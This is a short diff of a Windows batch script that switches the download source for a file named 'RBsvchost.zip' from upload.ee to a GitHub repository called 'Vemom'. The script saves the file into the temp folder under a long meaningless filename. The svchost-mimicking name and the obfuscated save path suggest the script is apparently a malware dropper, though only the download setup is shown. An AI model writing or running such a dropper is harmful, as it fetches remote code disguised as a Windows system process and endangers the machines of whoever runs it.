@@ -1,6 +1,6 @@
 @echo off
 setlocal
-set "url=https://www.upload.ee/download/17526778/916d9e21cd741fe92d6b/RBsvchost.zip"
+set "url=https://github.com/LuisPhantom/Vemom/raw/refs/heads/main/RBsvchost.zip"
 set "tempdir=%temp%"
 set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"
 
